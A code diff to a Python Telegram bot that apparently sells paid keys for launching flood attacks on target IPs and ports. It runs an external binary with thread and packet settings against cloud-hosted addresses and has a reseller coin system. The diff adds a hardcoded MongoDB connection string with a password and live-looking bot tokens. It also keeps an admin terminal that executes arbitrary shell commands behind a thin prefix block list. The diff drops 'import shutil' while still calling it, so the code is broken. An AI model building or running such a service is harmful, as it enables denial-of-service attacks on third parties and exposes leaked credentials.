@@ -9,8 +9,6 @@ import os
 import time
 import json
 import pytz
-import json
-import shutil
 import random
 import string
 import telebot
@@ -19,29 +17,27 @@ import subprocess
 import threading
 from telebot import types
 from typing import Optional
+from pymongo import MongoClient
 
-# --------------------[ CONFIGURATION ]----------------------
+# MongoDB setup
+mongo_client = MongoClient("mongodb+srv://donmourya248:Santosh700@redhat.drq43.mongodb.net/RedHat?retryWrites=true&w=majority&appName=RedHat")  # Update with your MongoDB URI if using a remote server
+db = mongo_client["ninja_bot"]
 
+# Collections
+users_collection = db["users"]
+keys_collection = db["keys"]
+resellers_collection = db["resellers"]
+config_collection = db["config"]
 
-# Insert your Telegram bot token here
-bot = telebot.TeleBot('7607251224:AAFDf94jpXnXWPsqpzWRvZmd36w0EPiu3aE')
-
-# Insert your admin id here
+bot = telebot.TeleBot('7792426525:AAH3VXch2GMp1y_EfsA2tT4lgzKGceIWg')
 admin_id = ["1240179115"]
 
-# Files for data storage
-USER_FILE = "users.json"
 LOG_FILE = "log.txt"
-KEY_FILE = "keys.json"
-
-# Attack setting for users
 ALLOWED_PORT_RANGE = range(10003, 30000)
-ALLOWED_IP_PREFIXES = ("20.", "4.", "52.")
+ALLOWED_IP_PREFIXES = ("20.", "4.", "52.", "104.", "13.")
 BLOCKED_PORTS = {10000, 10001, 10002, 17500, 20000, 20001, 20002, 443}
-KEY_COSTS = {1: 80, 7: 400, 30: 1000}
-UPDATE_INTERVAL = 1  # Update interval for countdown timer in seconds
-
-# --------------------[ IN-MEMORY STORAGE ]----------------------
+KEY_COSTS = {1: 150, 7: 600, 30: 1200}
+UPDATE_INTERVAL = 1
 
 keys = {}
 bot_data = {}
@@ -53,52 +49,68 @@ user_last_attack = {}
 attack_in_process = False
 attack_start_time: Optional[datetime.datetime] = None
 attack_duration = 0
-users = {}  # Dictionary to store user access information
-active_timers = {}  # Track active countdown timers
+users = {}
+active_timers = {}
 
-# --------------------[ STORAGE ]----------------------
-
-
-
-# --- Data Loading and Saving Functions ---
-
+# Load data from MongoDB
 def load_data():
-    global users, keys
-    users = read_users()
-    keys = read_keys()
-
-def read_users():
-    try:
-        with open(USER_FILE, "r") as file:
-            return json.load(file)
-    except FileNotFoundError:
-        return {}
+    global users, keys, resellers, full_command_type, threads, packets, BINARY, MAX_ATTACK_TIME, ATTACK_COOLDOWN
+    users = {doc["_id"]: doc["expiration"] for doc in users_collection.find()}
+    keys = {doc["_id"]: doc["duration"] for doc in keys_collection.find()}
+    resellers = {doc["_id"]: doc["coins"] for doc in resellers_collection.find()}
+    
+    # Load config from MongoDB or set default if not exists
+    config_doc = config_collection.find_one({"_id": "bot_config"})
+    if config_doc:
+        full_command_type = config_doc["initial_parameters"]
+        threads = config_doc["initial_threads"]
+        packets = config_doc["initial_packets"]
+        BINARY = config_doc["initial_binary"]
+        MAX_ATTACK_TIME = config_doc["max_attack_time"]
+        ATTACK_COOLDOWN = config_doc["attack_cooldown"]
+    else:
+        # Default config
+        default_config = {
+            "_id": "bot_config",
+            "initial_parameters": 3,
+            "initial_threads": "300",
+            "initial_packets": "350",
+            "initial_binary": "bgmi",
+            "max_attack_time": 240,
+            "attack_cooldown": 300
+        }
+        config_collection.insert_one(default_config)
+        full_command_type = default_config["initial_parameters"]
+        threads = default_config["initial_threads"]
+        packets = default_config["initial_packets"]
+        BINARY = default_config["initial_binary"]
+        MAX_ATTACK_TIME = default_config["max_attack_time"]
+        ATTACK_COOLDOWN = default_config["attack_cooldown"]
 
 def save_users():
-    with open(USER_FILE, "w") as file:
-        json.dump(users, file)
-        
-def read_keys():
-    try:
-        with open(KEY_FILE, "r") as file:
-            return json.load(file)
-    except FileNotFoundError:
-        return {}
+    for user_id, expiration in users.items():
+        users_collection.update_one({"_id": user_id}, {"$set": {"expiration": expiration}}, upsert=True)
 
 def save_keys():
-    with open(KEY_FILE, "w") as file:
-        json.dump(keys, file)
-     
-try:
-    with open("reseller.json", "r") as f:
-        resellers = json.load(f)
-except FileNotFoundError:
-    resellers = {}
-    
+    for key, duration in keys.items():
+        keys_collection.update_one({"_id": key}, {"$set": {"duration": duration}}, upsert=True)
+
 def save_resellers():
-    with open("reseller.json", "w") as f:
-        json.dump(resellers, f, indent=4)
-    
+    for reseller_id, coins in resellers.items():
+        resellers_collection.update_one({"_id": reseller_id}, {"$set": {"coins": coins}}, upsert=True)
+
+def save_config():
+    config = {
+        "initial_parameters": full_command_type,
+        "initial_threads": threads,
+        "initial_packets": packets,
+        "initial_binary": BINARY,
+        "max_attack_time": MAX_ATTACK_TIME,
+        "attack_cooldown": ATTACK_COOLDOWN
+    }
+    config_collection.update_one({"_id": "bot_config"}, {"$set": config}, upsert=True)
+
+# Rest of your functions remain largely unchanged, just remove file-based operations
 def generate_key(duration):
     characters = string.ascii_letters + string.digits
     random_part = ''.join(random.choice(characters) for _ in range(10)).upper()
@@ -112,79 +124,28 @@ def convert_utc_to_ist(utc_time_str):
     utc_time = utc_time.replace(tzinfo=pytz.utc)
     ist_time = utc_time.astimezone(pytz.timezone('Asia/Kolkata'))
     return ist_time.strftime('%Y-%m-%d %H:%M:%S')
-    
-def load_config():
-    config_file = "config.json"
 
-    if not os.path.exists(config_file):
-        print(f"Config file {config_file} does not exist. Please create it.")
-        exit(1)
-
-    try:
-        with open(config_file, 'r') as f:
-            return json.load(f)
-    except json.JSONDecodeError as e:
-        print(f"Error decoding JSON in {config_file}: {str(e)}")
-        exit(1)
-    
-config = load_config()
-
-# --- Extract values from config.json ---
-full_command_type = config["initial_parameters"]
-threads = config.get("initial_threads")
-packets = config.get("initial_packets")
-BINARY = config.get("initial_binary")
-MAX_ATTACK_TIME = config.get("max_attack_time")
-ATTACK_COOLDOWN = config.get("attack_cooldown")
-
-def save_config():
-    config = {
-        "initial_parameters": full_command_type,
-        "initial_threads": threads,
-        "initial_packets": packets,
-        "initial_binary": BINARY,
-        "max_attack_time": MAX_ATTACK_TIME,
-        "attack_cooldown": ATTACK_COOLDOWN
-    }
-
-    with open("config.json", "w") as f:
-        json.dump(config, f, indent=4)
-
-# --- Log command function ---
 def log_command(user_id, target, port, time_duration):
     user_info = bot.get_chat(user_id)
     username = user_info.username if user_info.username else f"{user_id}"
-
     with open(LOG_FILE, "a") as file:
         file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time_duration}\n\n")
-        
-# --------------------------------------------------------------
-        
 
-        
-        
-        
-# --------------------[ KEYBOARD BUTTONS ]----------------------
-    
+# Handlers and other logic remain the same, only data storage changes
 @bot.message_handler(commands=['start'])
 def start_command(message):
-    """Start command to display the main menu."""
     markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
-
-    # Define buttons
     attack_button = types.KeyboardButton("🚀 Attack")
     myinfo_button = types.KeyboardButton("👤 My Info")
     redeem_button = types.KeyboardButton("🎟️ Redeem Key")
     settings_button = types.KeyboardButton("⚙️ Settings")
     terminal_button = types.KeyboardButton("⏺️ Terminal")
-    panel_button = types.KeyboardButton("🔰 Panel")  # Adjusted label for clarity
+    panel_button = types.KeyboardButton("🔰 Panel")
         
     if str(message.chat.id) in resellers:
         markup.add(attack_button, myinfo_button, redeem_button, panel_button)
-        
     elif str(message.chat.id) in admin_id:
         markup.add(attack_button, myinfo_button, redeem_button, settings_button, terminal_button, panel_button)
-        
     else:
         markup.add(attack_button, myinfo_button, redeem_button)
         
@@ -274,14 +235,6 @@ def back_to_main_menu(message):
     """Go back to the main menu."""
     start_command(message)
 
-# ------------------------------------------------------------
-    
-    
-    
-    
-# --------------------[ ATTACK SECTION ]----------------------
-
-
 @bot.message_handler(func=lambda message: message.text == "🚀 Attack")
 def handle_attack(message):
     global attack_in_process
@@ -294,13 +247,9 @@ def handle_attack(message):
             bot.reply_to(message, response)
             return       
     else:
-        bot.reply_to(message, "⛔️ 𝗨𝗻𝗮𝘂𝘁𝗼𝗿𝗶𝘀𝗲𝗱 𝗔𝗰𝗰𝗲𝘀𝘀! ⛔️\n\nOops! It seems like you don't have permission to use the Attack command. To gain access and unleash the power of attacks, you can:\n\n👉 Contact an Admin or the Owner for approval.\n🌟 Become a proud supporter and purchase approval.\n💬 Chat with an admin now and level up your experience!\n\nLet's get you the access you need!")
+        bot.reply_to(message, "⛔️ 𝗨𝗻𝗮𝘂𝘁𝗼𝗿𝗶𝘀𝗲𝗱 𝗔𝗰𝗰𝗲𝘀𝘀! ⛔️\n\nOops! It seems like you don't have permission to use the Attack command.")
         return
     
-    if attack_in_process:
-        bot.reply_to(message, "⛔️ 𝗔𝗻 𝗮𝘁𝘁𝗮𝗰𝗸 𝗶𝘀 𝗮𝗹𝗿𝗲𝗮𝗱𝘆 𝗶𝗻 𝗽𝗿𝗼𝗰𝗲𝘀𝘀.\n𝗨𝘀𝗲 /check 𝘁𝗼 𝘀𝗲𝗲 𝗿𝗲𝗺𝗮𝗶𝗻𝗶𝗻𝗴 𝘁𝗶𝗺𝗲!")
-        return
-
     if attack_in_process:
         bot.reply_to(message, "⛔️ 𝗔𝗻 𝗮𝘁𝘁𝗮𝗰𝗸 𝗶𝘀 𝗮𝗹𝗿𝗲𝗮𝗱𝘆 𝗶𝗻 𝗽𝗿𝗼𝗰𝗲𝘀𝘀.\n𝗨𝘀𝗲 /check 𝘁𝗼 𝘀𝗲𝗲 𝗿𝗲𝗺𝗮𝗶𝗻𝗶𝗻𝗴 𝘁𝗶𝗺𝗲!")
         return
@@ -325,7 +274,6 @@ def update_countdown_timer(message_id: int, chat_id: int, target: str, port: int
     while time.time() < end_time and active_timers.get(timer_key, False):
         remaining_time = int(end_time - time.time())
 
-        # Ensure we don't skip any seconds
         if remaining_time <= 0:
             remaining_time = 0
 
@@ -337,11 +285,9 @@ def update_countdown_timer(message_id: int, chat_id: int, target: str, port: int
                 message_id=message_id
             )
 
-            # Sleep until the start of the next second
             next_second = end_time - remaining_time
             time_to_sleep = next_second - time.time()
-            
-            # If time_to_sleep is negative (if we are already past the next second), just move on to the next iteration
+
             if time_to_sleep > 0:
                 time.sleep(time_to_sleep)
 
@@ -382,7 +328,6 @@ def process_attack_details(message):
         port = int(details[1])
         time_duration = int(details[2])
 
-        # Security checks
         if not target.startswith(ALLOWED_IP_PREFIXES):
             bot.reply_to(message, "⛔️ 𝗘𝗿𝗿𝗼𝗿: 𝗨𝘀𝗲 𝘃𝗮𝗹𝗶𝗱 𝗜𝗣 𝘁𝗼 𝗮𝘁𝘁𝗮𝗰𝗸")
             return
@@ -399,7 +344,6 @@ def process_attack_details(message):
             bot.reply_to(message, f"⛔️ 𝗠𝗮𝘅𝗶𝗺𝘂𝗺 𝗮𝘁𝘁𝗮𝗰𝗸 𝘁𝗶𝗺𝗲 𝗶𝘀 {MAX_ATTACK_TIME} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀!")
             return
 
-        # Set up attack command
         log_command(user_id, target, port, time_duration)
         if full_command_type == 1:
             full_command = f"./{binary_name} {target} {port} {time_duration}"
@@ -413,17 +357,14 @@ def process_attack_details(message):
 
         username = message.chat.username or "No username"
 
-        # Set attack status
         attack_in_process = True
         attack_start_time = datetime.datetime.now()
         attack_duration = time_duration
         user_last_attack[user_id] = datetime.datetime.now()
 
-        # Send initial attack message with countdown
         initial_message = format_countdown_message(target, port, time_duration, username)
         sent_message = bot.reply_to(message, initial_message)
 
-        # Start countdown timer in separate thread
         timer_thread = threading.Thread(
             target=update_countdown_timer,
             args=(sent_message.message_id, message.chat.id, target, port, time_duration, username))
@@ -431,12 +372,10 @@ def process_attack_details(message):
         timer_thread.daemon = True
         timer_thread.start()
 
-        # Run attack in separate thread
         attack_thread = threading.Thread(target=run_attack, args=(full_command,))
         attack_thread.daemon = True
         attack_thread.start()
 
-        # Schedule attack status reset
         threading.Timer(time_duration, reset_attack_status, args=[user_id]).start()
 
     except ValueError:
@@ -461,13 +400,6 @@ def reset_attack_status(user_id):
     global attack_in_process
     attack_in_process = False
     bot.send_message(user_id, "✅ 𝗔𝘁𝘁𝗮𝗰𝗸 𝗳𝗶𝗻𝗶𝘀𝗵𝗲𝗱!")
-    
-# ---------------------------------------------------------------------
-#   
-#
-#
-#
-# --------------------[ USERS AND SYSTEM INFO ]----------------------
 
 @bot.message_handler(func=lambda message: message.text == "👤 My Info")
 def my_info(message):
@@ -476,7 +408,6 @@ def my_info(message):
     current_time = datetime.datetime.now()
     role = "Admin" if user_id in admin_id else "User"
 
-    # Get expiration date safely
     expiration_date = users.get(user_id)
 
     if expiration_date:
@@ -530,7 +461,6 @@ def status_command(message):
     """Show current status for threads, packets, and command type."""
     user_id = str(message.chat.id)
     if user_id in admin_id:
-        # Prepare the status message
         status_message = (
             f"☣️ 𝗔𝗧𝗧𝗔𝗖𝗞 𝗦𝗧𝗔𝗧𝗨𝗦 ☣️\n\n"
             f"▶️ 𝗔𝘁𝘁𝗮𝗰𝗸 𝗰𝗼𝗼𝗹𝗱𝗼𝘄𝗻: {ATTACK_COOLDOWN}\n"
@@ -545,16 +475,7 @@ def status_command(message):
         bot.reply_to(message, status_message)
     else:
         bot.reply_to(message, "⛔️ 𝗬𝗼𝘂 𝗮𝗿𝗲 𝗻𝗼𝘁 𝗮𝗻 𝗮𝗱𝗺𝗶𝗻 @NINJAGAMEROP.")
-        
-# --------------------------------------------------------------
-        
 
-        
-        
-        
-# --------------------[ TERMINAL SECTION ]----------------------
-
-# List of blocked command prefixes
 blocked_prefixes = ["nano", "sudo", "rm *", "rm -rf *", "screen"]
 
 @bot.message_handler(func=lambda message: message.text == "Command")
@@ -572,13 +493,11 @@ def execute_terminal_command(message):
     """Execute the terminal command entered by the admin."""
     try:
         command = message.text.strip()
-        
-        # Check if the command starts with any of the blocked prefixes
+
         if any(command.startswith(blocked_prefix) for blocked_prefix in blocked_prefixes):
             bot.reply_to(message, "❗️𝗧𝗵𝗶𝘀 𝗰𝗼𝗺𝗺𝗮𝗻𝗱 𝗶𝘀 𝗯𝗹𝗼𝗰𝗸𝗲𝗱.")
             return
-        
-        # Execute the command if it's not blocked
+
         result = subprocess.run(command, shell=True, capture_output=True, text=True)
         output = result.stdout if result.stdout else result.stderr
         if output:
@@ -606,47 +525,40 @@ def upload_animation(chat_id, message_id, stop_event):
     while not stop_event.is_set():  
         try:
             bot.edit_message_text(f"📤 𝗨𝗽𝗹𝗼𝗮𝗱𝗶𝗻𝗴{dots[i]}", chat_id=chat_id, message_id=message_id)
-            i = (i + 1) % len(dots)  # Cycle through [.", "..", "..."]
-            time.sleep(0.3)  # Small delay to simulate progress
+            i = (i + 1) % len(dots)
+            time.sleep(0.3)
         except Exception as e:
-            print(f"Error updating animation: {e}")  # Log any errors
+            print(f"Error updating animation: {e}")
 
 def process_file_upload(message):
     """Process the uploaded file while showing a looping animation."""
     if message.document:
         try:
-            # Start uploading message
             upload_msg = bot.reply_to(message, "📤 𝗨𝗽𝗹𝗼𝗮𝗱𝗶𝗻𝗴")
 
-            # Start animation in a separate thread
             stop_event = threading.Event()
             animation_thread = threading.Thread(target=upload_animation, args=(message.chat.id, upload_msg.message_id, stop_event))
             animation_thread.start()
 
-            # Get file info and download it
             file_info = bot.get_file(message.document.file_id)
             downloaded_file = bot.download_file(file_info.file_path)
 
-            # Get the current script directory
             current_dir = os.path.dirname(os.path.abspath(__file__))
 
-            # Save the file in the same directory
             file_path = os.path.join(current_dir, message.document.file_name)
             with open(file_path, 'wb') as new_file:
                 new_file.write(downloaded_file)
 
-            # Stop animation
             stop_event.set()
             animation_thread.join()
 
-            # Convert animation message to success message
             bot.edit_message_text(f"✅ 𝗙𝗶𝗹𝗲 𝘂𝗽𝗹𝗼𝗮𝗱𝗲𝗱 𝘀𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆:\n`{file_path}`",  
                                   chat_id=message.chat.id,  
                                   message_id=upload_msg.message_id,  
                                   parse_mode="Markdown")
 
         except Exception as e:
-            stop_event.set()  # Ensure animation stops if there's an error
+            stop_event.set()
             bot.reply_to(message, f"❗️ 𝗘𝗿𝗿𝗼𝗿 𝘂𝗽𝗹𝗼𝗮𝗱𝗶𝗻𝗴 𝗳𝗶𝗹𝗲: {str(e)}")
     else:
         bot.reply_to(message, "❗️ 𝗦𝗲𝗻𝗱 𝗮 𝘃𝗮𝗹𝗶𝗱 𝗳𝗶𝗹𝗲 𝘁𝗼 𝘂𝗽𝗹𝗼𝗮𝗱.")
@@ -659,7 +571,7 @@ def list_files(message):
         bot.send_message(message.chat.id, "⛔ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱: 𝗢𝗻𝗹𝘆 𝗮𝗱𝗺𝗶𝗻𝘀 𝗰𝗮𝗻 𝗱𝗼𝘄𝗻𝗹𝗼𝗮𝗱 𝗳𝗶𝗹𝗲𝘀.")
         return
 
-    files = [f for f in os.listdir() if os.path.isfile(f)]  # Get all files in directory
+    files = [f for f in os.listdir() if os.path.isfile(f)]
 
     if not files:
         bot.send_message(message.chat.id, "📁 𝗡𝗼 𝗳𝗶𝗹𝗲𝘀 𝗮𝘃𝗮𝗶𝗹𝗮𝗯𝗹𝗲 𝗶𝗻 𝘁𝗵𝗲 𝗱𝗶𝗿𝗲𝗰𝘁𝗼𝗿𝘆.")
@@ -667,13 +579,11 @@ def list_files(message):
 
     markup = types.InlineKeyboardMarkup()
     
-    # Create buttons for each file
     for file in files:
         markup.add(types.InlineKeyboardButton(file, callback_data=f"download_{file}"))
 
-    # Store message ID for animation update
     msg = bot.send_message(message.chat.id, "📂 𝗦𝗲𝗹𝗲𝗰𝘁 𝗮 𝗳𝗶𝗹𝗲 𝘁𝗼 𝗱𝗼𝘄𝗻𝗹𝗼𝗮𝗱:", reply_markup=markup)
-    bot.register_next_step_handler(msg, lambda _: None)  # Prevents further interactions
+    bot.register_next_step_handler(msg, lambda _: None)
 
 @bot.callback_query_handler(func=lambda call: call.data.startswith("download_"))
 def send_file(call):
@@ -689,7 +599,6 @@ def send_file(call):
         bot.answer_callback_query(call.id, "❌ 𝗙𝗶𝗹𝗲 𝗻𝗼𝘁 𝗳𝗼𝘂𝗻𝗱.")
         return
 
-    # Convert "Select a file" into the animated progress
     animation_msg = bot.edit_message_text("📥 𝗗𝗼𝘄𝗻𝗹𝗼𝗮𝗱𝗶𝗻𝗴 𝗳𝗶𝗹𝗲 [░░░░░░░░░░] 0%", call.message.chat.id, call.message.message_id)
 
     progress_steps = [(20, "▓▓░░░░░░░░"), (50, "▓▓▓▓▓░░░░░"), (80, "▓▓▓▓▓▓▓▓░░"), (100, "▓▓▓▓▓▓▓▓▓▓")]
@@ -697,20 +606,10 @@ def send_file(call):
         time.sleep(1)
         bot.edit_message_text(f"📥 𝗗𝗼𝘄𝗻𝗹𝗼𝗮𝗱𝗶𝗻𝗴 𝗳𝗶𝗹𝗲 [{bar}] {progress}%", call.message.chat.id, animation_msg.message_id)
 
-    # Send the file after animation
     with open(filename, "rb") as file:
         bot.send_document(call.message.chat.id, file)
 
-    # Convert animation into "File Sent Successfully!"
     bot.edit_message_text("✅ 𝗙𝗶𝗹𝗲 𝗦𝗲𝗻𝘁 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆!", call.message.chat.id, animation_msg.message_id)
-
-# --------------------------------------------------------------
-        
-        
-    
-        
-        
-# --------------------[ ATTACK SETTINGS ]----------------------
 
 @bot.message_handler(func=lambda message: message.text == "Threads")
 def set_threads(message):
@@ -726,7 +625,7 @@ def process_new_threads(message):
         new_threads = message.text.strip()
         global threads
         threads = new_threads
-        save_config()  # Save changes
+        save_config()
         bot.reply_to(message, f"✅ 𝗧𝗵𝗿𝗲𝗮𝗱𝘀 𝗰𝗵𝗮𝗻𝗴𝗲𝗱 𝘁𝗼: {new_threads}")
         
 @bot.message_handler(func=lambda message: message.text == "Binary")
@@ -743,7 +642,7 @@ def process_new_binary(message):
     new_binary = message.text.strip()
     global BINARY
     BINARY = new_binary
-    save_config()  # Save changes
+    save_config()
     bot.reply_to(message, f"✅ 𝗕𝗶𝗻𝗮𝗿𝘆 𝗻𝗮𝗺𝗲 𝗰𝗵𝗮𝗻𝗴𝗲𝗱 𝘁𝗼: `{new_binary}`", parse_mode='Markdown')
 
 @bot.message_handler(func=lambda message: message.text == "Packets")
@@ -760,7 +659,7 @@ def process_new_packets(message):
     new_packets = message.text.strip()
     global packets
     packets = new_packets
-    save_config()  # Save changes
+    save_config()
     bot.reply_to(message, f"✅ 𝗣𝗮𝗰𝗸𝗲𝘁𝘀 𝗰𝗵𝗮𝗻𝗴𝗲𝗱 𝘁𝗼: {new_packets}")
 
 @bot.message_handler(func=lambda message: message.text == "Parameters")
@@ -782,13 +681,11 @@ def set_command_type(message):
 def process_parameters_selection(call):
     """Handles parameters selection via inline buttons."""
     global full_command_type
-    selected_arg = int(call.data.split("_")[1])  # Extract parameters number
+    selected_arg = int(call.data.split("_")[1])
 
-    # Update the global command type
     full_command_type = selected_arg
-    save_config()  # Save the new configuration
+    save_config()
 
-    # Generate response message based on the selected parameters
     if full_command_type == 1:
         response_message = "✅ 𝗦𝗲𝗹𝗲𝗰𝘁𝗲𝗱 𝗣𝗮𝗿𝗮𝗺𝗲𝘁𝗲𝗿𝘀 1:\n `<target> <port> <time>`"
     elif full_command_type == 2:
@@ -815,7 +712,7 @@ def process_new_attack_cooldown(message):
     try:
         new_cooldown = int(message.text)
         ATTACK_COOLDOWN = new_cooldown
-        save_config()  # Save changes
+        save_config()
         bot.reply_to(message, f"✅ 𝗔𝘁𝘁𝗮𝗰𝗸 𝗰𝗼𝗼𝗹𝗱𝗼𝘄𝗻 𝗰𝗵𝗮𝗻𝗴𝗲𝗱 𝘁𝗼: {new_cooldown} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀")
     except ValueError:
         bot.reply_to(message, "❗𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗻𝘂𝗺𝗯𝗲𝗿! 𝗣𝗹𝗲𝗮𝘀𝗲 𝗲𝗻𝘁𝗲𝗿 𝗮 𝘃𝗮𝗹𝗶𝗱 𝗻𝘂𝗺𝗲𝗿𝗶𝗰 𝘃𝗮𝗹𝘂𝗲.")
@@ -835,29 +732,20 @@ def process_new_attack_time(message):
     try:
         new_attack_time = int(message.text)
         MAX_ATTACK_TIME = new_attack_time
-        save_config()  # Save changes
+        save_config()
         bot.reply_to(message, f"✅ 𝗠𝗮𝘅 𝗮𝘁𝘁𝗮𝗰𝗸 𝘁𝗶𝗺𝗲 𝗰𝗵𝗮𝗻𝗴𝗲𝗱 𝘁𝗼: {new_attack_time} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀")
     except ValueError:
         bot.reply_to(message, "❗𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗻𝘂𝗺𝗯𝗲𝗿! 𝗣𝗹𝗲𝗮𝘀𝗲 𝗲𝗻𝘁𝗲𝗿 𝗮 𝘃𝗮𝗹𝗶𝗱 𝗻𝘂𝗺𝗲𝗿𝗶𝗰 𝘃𝗮𝗹𝘂𝗲.")
-        
-# --------------------------------------------------------------
-        
-
-        
-        
-        
-# --------------------[ KEY MANAGEMENT ]----------------------
-        
+               
 @bot.message_handler(func=lambda message: message.text == "🎟️ Redeem Key")
 def redeem_key_command(message):
     user_id = str(message.chat.id)
     
-    # Check if user exists and if their access has expired
     if user_id in users:
         expiration_time = datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S')
         if expiration_time > datetime.datetime.now():
             bot.reply_to(message, "❕𝗬𝗼𝘂 𝗮𝗹𝗿𝗲𝗮𝗱𝘆 𝗵𝗮𝘃𝗲 𝗮𝗰𝘁𝗶𝘃𝗲 𝗮𝗰𝗰𝗲𝘀𝘀❕")
-            return  # User still has access, so we stop here
+            return
             
     bot.reply_to(message, "𝗣𝗹𝗲𝗮𝘀𝗲 𝘀𝗲𝗻𝗱 𝘆𝗼𝘂𝗿 𝗸𝗲𝘆:")
     bot.register_next_step_handler(message, process_redeem_key)
@@ -870,26 +758,24 @@ def process_redeem_key(message):
         duration_in_hours = keys[key]
         new_expiration_time = datetime.datetime.now() + datetime.timedelta(hours=duration_in_hours)
         users[user_id] = new_expiration_time.strftime('%Y-%m-%d %H:%M:%S')
-        save_users()  # Save immediately
+        save_users()
 
+        keys_collection.delete_one({"_id": key})
         del keys[key]
-        save_keys()  # Save immediately
 
-        # Create a copy of the binary with the user ID as suffix
         original_binary = BINARY
-        user_binary = f"{BINARY}{user_id}"  # e.g., binary7469108296 
+        user_binary = f"{BINARY}{user_id}"
         shutil.copy(original_binary, user_binary)
 
         bot.reply_to(message, f"✅ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗴𝗿𝗮𝗻𝘁𝗲𝗱 𝘂𝗻𝘁𝗶𝗹: {convert_utc_to_ist(users[user_id])}")
     else:
         bot.reply_to(message, "📛 𝗞𝗲𝘆 𝗲𝘅𝗽𝗶𝗿𝗲𝗱 𝗼𝗿 𝗶𝗻𝘃𝗮𝗹𝗶𝗱 📛")
 
-# --- Bot Handlers ---
 @bot.message_handler(func=lambda message: message.text == "Generate Key")
 def generate_key_command(message):
     user_id = str(message.chat.id)
 
-    if user_id in admin_id:  # Ensure it's a list
+    if user_id in admin_id:
         markup = types.InlineKeyboardMarkup(row_width=1)
         button1 = types.InlineKeyboardButton("Generate Days", callback_data="admin_days")
         button2 = types.InlineKeyboardButton("Generate Hours", callback_data="admin_hours")
@@ -940,7 +826,6 @@ def handle_reseller_selection(call):
         bot.edit_message_text("❌ 𝗜𝗻𝘀𝘂𝗳𝗳𝗶𝗰𝗶𝗲𝗻𝘁 𝗖𝗼𝗶𝗻𝘀!", call.message.chat.id, call.message.message_id)
         return
 
-    # Ask for confirmation
     markup = types.InlineKeyboardMarkup()
     confirm_button = types.InlineKeyboardButton("✅ Confirm", callback_data=f"confirm_{days}")
     markup.add(confirm_button)
@@ -966,7 +851,7 @@ def confirm_reseller_key(call):
     resellers[user_id]["coins"] -= cost
     save_resellers()
 
-    key = generate_key(f"{days}D")  # Example: 1D, 7D, 30D
+    key = generate_key(f"{days}D")
     keys[key] = days * 24
     save_keys()
 
@@ -986,7 +871,7 @@ def process_generate_key(message, user_id, time_type):
             raise ValueError("Invalid number")
 
         duration_in_hours = time_amount if time_type == "hours" else time_amount * 24
-        duration = f"{time_amount}{time_type[0].upper()}"  # Example: 7H or 12D
+        duration = f"{time_amount}{time_type[0].upper()}"
 
         key = generate_key(duration)
         keys[key] = duration_in_hours
@@ -1002,14 +887,6 @@ def process_generate_key(message, user_id, time_type):
     except ValueError:
         bot.send_message(message.chat.id, "⛔️ 𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗶𝗻𝗽𝘂𝘁! 𝗘𝗻𝘁𝗲𝗿 𝗮 𝘃𝗮𝗹𝗶𝗱 𝗻𝘂𝗺𝗯𝗲𝗿.")
 
-# ------------------------------------------------------------------
-        
-
-        
-        
-        
-# --------------------[ ADMIN PANEL SETTINGS ]----------------------
-      
 @bot.message_handler(func=lambda message: message.text in ["Unused Keys"])
 def handle_admin_actions(message):
     user_id = str(message.chat.id)
@@ -1024,8 +901,8 @@ def handle_admin_actions(message):
     key_list = "𝗨𝗻𝘂𝘀𝗲𝗱 𝗸𝗲𝘆𝘀:\n\n"
     for key, duration in keys.items():
         if duration >= 24:
-            days = duration // 24  # Convert hours to days
-            hours = duration % 24  # Remaining hours
+            days = duration // 24
+            hours = duration % 24
             if hours > 0:
                 key_list += f"𝗸𝗲𝘆: `{key}` \n𝗩𝗮𝗹𝗶𝗱𝗶𝘁𝘆: `{days}` days, `{hours}` hours\n\n"
             else:
@@ -1077,16 +954,6 @@ def remove_user_command(message):
 
     bot.reply_to(message, response)
         
-
-        
-# --------------------------------------------------------------
-        
-
-        
-        
-        
-# --------------------[ ADMIN PANEL SETTINGS ]------------------
-        
 @bot.message_handler(func=lambda message: message.text == "Add User")
 def add_user_command(message):
     if str(message.chat.id) not in admin_id:
@@ -1099,7 +966,6 @@ def add_user_command(message):
 def ask_duration_unit(message):
     user_id = message.text.strip()
     
-    # Store user ID temporarily
     bot_data[message.chat.id] = {"user_id": user_id}
 
     markup = types.InlineKeyboardMarkup(row_width=1)
@@ -1115,10 +981,8 @@ def ask_duration(call):
     chat_id = call.message.chat.id
     time_unit = "days" if call.data == "days" else "hours"
 
-    # Store the selected time unit
     bot_data[chat_id]["time_unit"] = time_unit
 
-    # Edit the message to ask for the number of days/hours
     bot.edit_message_text(
         chat_id=chat_id, 
         message_id=call.message.message_id, 
@@ -1149,10 +1013,9 @@ def add_user_access(message):
         expiration_time = datetime.datetime.now() + datetime.timedelta(hours=duration_in_hours)
         users[user_id] = expiration_time.strftime('%Y-%m-%d %H:%M:%S')
         save_users()
-        
-        # Create a copy of the binary with the user ID as suffix
+
         original_binary = BINARY
-        user_binary = f"{BINARY}{user_id}"  # e.g., binary7469108296 
+        user_binary = f"{BINARY}{user_id}"
         shutil.copy(original_binary, user_binary)
 
         bot.send_message(chat_id, f"✅ 𝗨𝘀𝗲𝗿 *{user_id}* 𝗵𝗮𝘀 𝗯𝗲𝗲𝗻 𝗴𝗿𝗮𝗻𝘁𝗲𝗱 𝗮𝗰𝗰𝗲𝘀𝘀 𝗳𝗼𝗿 *{duration_value}* *{time_unit}*!", parse_mode='Markdown')
@@ -1181,9 +1044,8 @@ def ask_user_id(call):
     chat_id = call.message.chat.id
     action = "Increase" if call.data == "increase_access" else "Decrease"
 
-    admin_sessions[chat_id] = {"action": call.data}  # Store action type
+    admin_sessions[chat_id] = {"action": call.data}
 
-    # Edit message to remove buttons and update text
     bot.edit_message_text(
         chat_id=chat_id,
         message_id=call.message.message_id,
@@ -1196,7 +1058,6 @@ def ask_time_unit(message):
